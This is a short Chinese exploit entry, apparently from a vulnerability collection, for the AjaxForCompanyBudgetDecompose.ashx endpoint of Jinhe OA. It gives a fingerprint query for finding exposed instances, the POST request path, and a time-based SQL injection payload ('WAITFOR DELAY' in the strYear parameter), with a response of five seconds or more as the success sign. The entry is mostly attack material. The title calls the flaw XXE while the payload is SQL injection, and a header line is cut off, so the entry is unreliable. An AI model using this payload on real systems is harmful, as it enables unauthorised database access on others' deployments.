# 金和OAAjaxForCompanyBudgetDecompose存在XXE漏洞

金和OA ｜ XXE ｜ —
- **指纹**：`app="金和网络-金和OA"`
- **请求**：`POST /c6/JHSoft.Web.CostControl/Decompose/AjaxForCompanyBudgetDecompose.ashx/ HTTP/1.1`

**Payload**
```
like Gecko) Chrome/91.0.4472.77 Safari/537.36
strType=getBudgetTime&strYear=1;WAITFOR DELAY '0:0:5'--
```
- **响应特征**：200 响应时间>=5s